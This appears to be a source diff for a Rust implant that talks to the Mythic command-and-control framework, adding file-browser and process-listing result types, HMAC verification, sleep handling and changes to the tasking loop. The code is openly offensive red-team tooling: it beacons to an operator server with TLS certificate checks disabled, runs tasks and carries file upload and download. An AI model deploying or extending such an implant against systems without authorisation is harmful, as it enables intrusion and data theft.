@@ -11,6 +11,74 @@ pub mod dispatch;
 
 // ── Wire types Mythic ──────────────────────────────────────────────────────────
 
+// ── Structured browser types (Mythic process_browser / file_browser) ──────────
+
+#[derive(serde::Serialize, Clone)]
+pub struct ProcessEntry {
+    pub process_id: u32,
+    pub name: String,
+    pub parent_process_id: u32,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub user: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub command_line: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub bin_path: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub architecture: Option<String>,
+}
+
+#[derive(serde::Serialize, Clone)]
+pub struct FileBrowserEntry {
+    pub name: String,
+    pub is_file: bool,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub size: Option<u64>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub permissions: Option<FileBrowserPermission>,
+}
+
+#[derive(serde::Serialize, Clone)]
+pub struct FileBrowserPermission {
+    pub permissions: String,
+}
+
+#[derive(serde::Serialize, Clone)]
+pub struct FileBrowserResult {
+    pub host: String,
+    pub is_file: bool,
+    pub name: String,
+    pub parent_path: String,
+    pub files: Vec<FileBrowserEntry>,
+    pub success: bool,
+}
+
+// ── CommandOutput (dispatch return type) ──────────────────────────────────────
+
+pub struct CommandOutput {
+    pub text: String,
+    pub processes: Option<Vec<ProcessEntry>>,
+    pub file_browser: Option<FileBrowserResult>,
+}
+
+impl CommandOutput {
+    pub fn text(s: String) -> Self {
+        Self {
+            text: s,
+            processes: None,
+            file_browser: None,
+        }
+    }
+}
+
+impl From<String> for CommandOutput {
+    fn from(s: String) -> Self {
+        Self::text(s)
+    }
+}
+
+// ── Mythic wire types ─────────────────────────────────────────────────────────
+
 #[derive(serde::Serialize)]
 pub struct CheckinMessage<'a> {
     pub action: &'a str,
@@ -69,6 +137,10 @@ pub struct TaskResponse {
     pub download: Option<DownloadRegistration>,
     #[serde(skip_serializing_if = "Option::is_none")]
     pub upload: Option<UploadRequest>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub processes: Option<Vec<ProcessEntry>>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub file_browser: Option<FileBrowserResult>,
 }
 
 #[derive(serde::Serialize)]
@@ -132,6 +204,11 @@ pub struct PostResponseMessage<'a> {
 
 // ── HTTP client ────────────────────────────────────────────────────────────────
 
+// build_client creates an HTTP client with TLS verification disabled.
+// TLS verification is intentionally disabled because C2 infrastructure typically uses
+// self-signed certificates. The transport is still encrypted via TLS; only certificate
+// chain validation is skipped. The implant authenticates the server through the shared
+// AES-256 key (AESPSK) — only a server with the correct key can produce valid responses.
 pub fn build_client() -> ureq::Agent {
     use std::time::Duration;
     let tls = ureq::tls::TlsConfig::builder()
@@ -185,6 +262,14 @@ fn hmac_sha256(key: &[u8], data: &[u8]) -> [u8; 32] {
     mac.finalize().into_bytes().into()
 }
 
+fn verify_hmac(key: &[u8], data: &[u8], expected: &[u8]) -> bool {
+    use hmac::{Hmac, Mac};
+    use sha2::Sha256;
+    let mut mac = Hmac::<Sha256>::new_from_slice(key).expect("HMAC key length");
+    mac.update(data);
+    mac.verify_slice(expected).is_ok()
+}
+
 /// Decode a base64-encoded 32-byte AES key (from Mythic AESPSK).
 pub fn decode_aes_key(b64_key: &str) -> Option<[u8; 32]> {
     use base64::{engine::general_purpose::STANDARD, Engine as _};
@@ -233,8 +318,7 @@ pub fn parse_mythic_message(raw: &str, key: &[u8; 32]) -> Option<String> {
     let iv_ct = &body[..hmac_offset];
     let received_hmac = &body[hmac_offset..];
 
-    let computed_hmac = hmac_sha256(key, iv_ct);
-    if computed_hmac != received_hmac {
+    if !verify_hmac(key, iv_ct, received_hmac) {
         return None;
     }
 
@@ -273,8 +357,7 @@ pub fn decrypt_config(enc_hex: &str, key: &[u8; 32]) -> Option<String> {
     let iv_ct = &data[..hmac_offset];
     let received_hmac = &data[hmac_offset..];
 
-    let computed_hmac = hmac_sha256(key, iv_ct);
-    if computed_hmac != received_hmac {
+    if !verify_hmac(key, iv_ct, received_hmac) {
         return None;
     }
 
@@ -401,6 +484,98 @@ pub fn list_dir(path: &str) -> String {
     }
 }
 
+pub fn list_dir_browser(path: &str) -> CommandOutput {
+    let resolved = expand_tilde(path);
+    let dir_path = std::path::Path::new(&resolved);
+    let canonical =
+        std::fs::canonicalize(dir_path).unwrap_or_else(|_| std::path::PathBuf::from(&resolved));
+    let name = canonical
+        .file_name()
+        .map(|n| n.to_string_lossy().to_string())
+        .unwrap_or_else(|| "/".into());
+    let parent = canonical
+        .parent()
+        .map(|p| p.display().to_string())
+        .unwrap_or_default();
+
+    match std::fs::read_dir(&resolved) {
+        Ok(entries) => {
+            let mut text_items = Vec::new();
+            let mut file_entries = Vec::new();
+            for entry in entries.flatten() {
+                let entry_name = entry.file_name().to_string_lossy().into_owned();
+                let is_dir = entry.file_type().map(|t| t.is_dir()).unwrap_or(false);
+                let metadata = entry.metadata().ok();
+                text_items.push(if is_dir {
+                    format!("{}/", entry_name)
+                } else {
+                    entry_name.clone()
+                });
+                file_entries.push(FileBrowserEntry {
+                    name: entry_name,
+                    is_file: !is_dir,
+                    size: metadata.as_ref().map(|m| m.len()),
+                    permissions: metadata.as_ref().map(|m| file_permissions(m)),
+                });
+            }
+            text_items.sort();
+            file_entries.sort_by(|a, b| a.name.cmp(&b.name));
+
+            CommandOutput {
+                text: text_items.join("\n"),
+                processes: None,
+                file_browser: Some(FileBrowserResult {
+                    host: portable_hostname(),
+                    is_file: false,
+                    name,
+                    parent_path: parent,
+                    files: file_entries,
+                    success: true,
+                }),
+            }
+        }
+        Err(e) => CommandOutput {
+            text: format!("[-] {}: {}", resolved, e),
+            processes: None,
+            file_browser: Some(FileBrowserResult {
+                host: portable_hostname(),
+                is_file: false,
+                name,
+                parent_path: parent,
+                files: Vec::new(),
+                success: false,
+            }),
+        },
+    }
+}
+
+fn portable_hostname() -> String {
+    std::fs::read_to_string("/etc/hostname")
+        .map(|s| s.trim().to_string())
+        .or_else(|_| std::env::var("COMPUTERNAME"))
+        .or_else(|_| std::env::var("HOSTNAME"))
+        .unwrap_or_else(|_| "unknown".into())
+}
+
+#[cfg(unix)]
+fn file_permissions(m: &std::fs::Metadata) -> FileBrowserPermission {
+    use std::os::unix::fs::PermissionsExt;
+    FileBrowserPermission {
+        permissions: format!("{:o}", m.permissions().mode() & 0o7777),
+    }
+}
+
+#[cfg(not(unix))]
+fn file_permissions(m: &std::fs::Metadata) -> FileBrowserPermission {
+    FileBrowserPermission {
+        permissions: if m.permissions().readonly() {
+            "readonly".into()
+        } else {
+            "readwrite".into()
+        },
+    }
+}
+
 const CHUNK_SIZE: usize = 512_000;
 
 /// Send a post_response message to Mythic and parse the response entries.
@@ -473,6 +648,8 @@ pub fn mythic_download(
             chunk_data: None,
         }),
         upload: None,
+        processes: None,
+        file_browser: None,
     };
     let resp = send_post_response(client, base_url, uri, callback_id, key, vec![reg]);
     let file_id = match resp.first() {
@@ -510,6 +687,8 @@ pub fn mythic_download(
                 chunk_data: Some(chunk_data),
             }),
             upload: None,
+            processes: None,
+            file_browser: None,
         };
         let resp = send_post_response(client, base_url, uri, callback_id, key, vec![chunk_resp]);
         if resp.first().map(|e| e.status.as_str()) != Some("success") {
@@ -558,6 +737,8 @@ pub fn mythic_upload(
             chunk_num: 1,
             full_path: Some(full_path.clone()),
         }),
+        processes: None,
+        file_browser: None,
     };
     let resp = send_post_response(client, base_url, uri, callback_id, key, vec![req]);
     let first = match resp.first() {
@@ -586,6 +767,8 @@ pub fn mythic_upload(
                 chunk_num,
                 full_path: None,
             }),
+            processes: None,
+            file_browser: None,
         };
         let resp = send_post_response(client, base_url, uri, callback_id, key, vec![req]);
         match resp.first() {
@@ -619,15 +802,14 @@ pub fn upload_file(_args: &str) -> String {
 }
 
 pub fn handle_sleep_command(args: &str) -> String {
-    if args.is_empty() {
+    let parts: Vec<&str> = args.split_whitespace().collect();
+    if parts.is_empty() {
         return format!(
             "sleep: {}s, jitter: {}%",
             get_sleep_seconds(),
             get_jitter_percent()
         );
     }
-    let parts: Vec<&str> = args.split_whitespace().collect();
-    // Parse as f64 first — Mythic sends NUMBER params as floats (e.g. "5.0")
     if let Ok(s) = parts[0].parse::<f64>() {
         set_sleep_seconds(s as u64);
         if parts.len() > 1 {
@@ -682,7 +864,7 @@ pub fn run_c2_loop<F>(
     reg: RegisterInfo,
     dispatch: F,
 ) where
-    F: Fn(&str, &str) -> String,
+    F: Fn(&str, &str) -> CommandOutput,
 {
     use zeroize::Zeroize;
 
@@ -799,6 +981,8 @@ pub fn run_c2_loop<F>(
                     status: None,
                     download: None,
                     upload: None,
+                    processes: None,
+                    file_browser: None,
                 });
                 should_exit = true;
                 break;
@@ -829,6 +1013,8 @@ pub fn run_c2_loop<F>(
                     },
                     download: None,
                     upload: None,
+                    processes: None,
+                    file_browser: None,
                 });
                 continue;
             }
@@ -857,16 +1043,18 @@ pub fn run_c2_loop<F>(
                     },
                     download: None,
                     upload: None,
+                    processes: None,
+                    file_browser: None,
                 });
                 continue;
             }
 
-            let output = dispatch(&task.command, &task.parameters);
-            let is_error = output.starts_with("[-]");
+            let result = dispatch(&task.command, &task.parameters);
+            let is_error = result.text.starts_with("[-]");
             responses.push(TaskResponse {
                 task_id: task.id.clone(),
                 completed: true,
-                user_output: Some(output),
+                user_output: Some(result.text),
                 status: if is_error {
                     Some("error".to_string())
                 } else {
@@ -874,6 +1062,8 @@ pub fn run_c2_loop<F>(
                 },
                 download: None,
                 upload: None,
+                processes: result.processes,
+                file_browser: result.file_browser,
             });
         }
 
